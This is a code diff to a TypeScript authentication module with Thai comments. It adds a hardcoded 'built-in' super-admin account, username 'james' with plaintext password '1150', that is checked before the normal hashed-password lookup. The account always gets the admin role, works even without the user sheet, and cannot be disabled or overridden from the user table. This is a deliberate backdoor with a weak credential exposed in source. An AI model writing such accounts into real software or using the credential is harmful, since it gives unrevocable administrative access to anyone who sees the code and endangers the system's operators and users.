@@ -28,6 +28,33 @@ export interface AppUser {
   perms: Perms;
 }
 
+// ===== built-in admin (hardcode) =====
+// เข้าได้เสมอ ไม่ต้องมีแถวใน _users และไม่ต้องพึ่ง Google Sheet
+// (ใช้กู้ระบบตอนลืมรหัส / ชีทพัง / โดนถอดสิทธิ์) — role=admin จึงผ่านทุก permission
+export const BUILTIN_ADMIN_ID = "U_BUILTIN_ADMIN";
+const BUILTIN_ADMIN_USERNAME = "james";
+const BUILTIN_ADMIN_PASSWORD = "1150";
+
+export function isBuiltinAdminName(username: string): boolean {
+  return (username || "").trim().toLowerCase() === BUILTIN_ADMIN_USERNAME;
+}
+
+export function builtinAdmin(): AppUser {
+  return {
+    id: BUILTIN_ADMIN_ID,
+    username: BUILTIN_ADMIN_USERNAME,
+    displayName: "James (Super Admin)",
+    role: "admin",
+    active: true,
+    perms: { tabs: {}, lists: true },
+  };
+}
+
+// true เมื่อ username+password ตรงกับ built-in admin
+export function matchBuiltinAdmin(username: string, password: string): boolean {
+  return isBuiltinAdminName(username) && password === BUILTIN_ADMIN_PASSWORD;
+}
+
 // ----- password hashing (scrypt) -----
 export function hashPassword(plain: string): string {
   const salt = randomBytes(16).toString("hex");
@@ -127,6 +154,9 @@ export async function listUsers(): Promise<AppUser[]> {
 
 // ตรวจ username + password → คืน user ถ้าผ่าน (และยัง active)
 export async function authenticate(username: string, password: string): Promise<AppUser | null> {
+  // built-in admin: เช็คก่อนแตะชีท → เข้าได้แม้ Sheets ล่ม/ยังไม่มีชีท _users
+  if (matchBuiltinAdmin(username, password)) return builtinAdmin();
+  if (isBuiltinAdminName(username)) return null; // ชื่อนี้สงวนไว้ ห้ามใช้แถวในชีทมาสวม
   await seedAdminIfEmpty();
   const uname = (username || "").trim().toLowerCase();
   const hit = (await rawUsers()).find((r) => r.username.trim().toLowerCase() === uname);
@@ -137,6 +167,7 @@ export async function authenticate(username: string, password: string): Promise<
 }
 
 export async function getUserByUsername(username: string): Promise<AppUser | null> {
+  if (isBuiltinAdminName(username)) return builtinAdmin();
   const uname = (username || "").trim().toLowerCase();
   const hit = (await rawUsers()).find((r) => r.username.trim().toLowerCase() === uname);
   return hit ? toAppUser(hit) : null;
@@ -154,6 +185,7 @@ export interface UserInput {
 export async function createUser(input: UserInput): Promise<AppUser> {
   const username = (input.username || "").trim();
   if (!username) throw new Error("ต้องระบุ username");
+  if (isBuiltinAdminName(username)) throw new Error(`username "${username}" สงวนไว้สำหรับผู้ดูแลระบบ`);
   if (!input.password) throw new Error("ต้องระบุรหัสผ่าน");
   const existing = await rawUsers();
   if (existing.some((r) => r.username.trim().toLowerCase() === username.toLowerCase()))
@@ -181,6 +213,8 @@ export async function updateUser(id: string, patch: UserInput & { password?: str
   if (!cur) throw new Error("ไม่พบผู้ใช้");
 
   const nextUsername = patch.username?.trim() || cur.username;
+  if (isBuiltinAdminName(nextUsername))
+    throw new Error(`username "${nextUsername}" สงวนไว้สำหรับผู้ดูแลระบบ`);
   if (
     nextUsername.toLowerCase() !== cur.username.toLowerCase() &&
     all.some((r) => r.__id !== id && r.username.trim().toLowerCase() === nextUsername.toLowerCase())
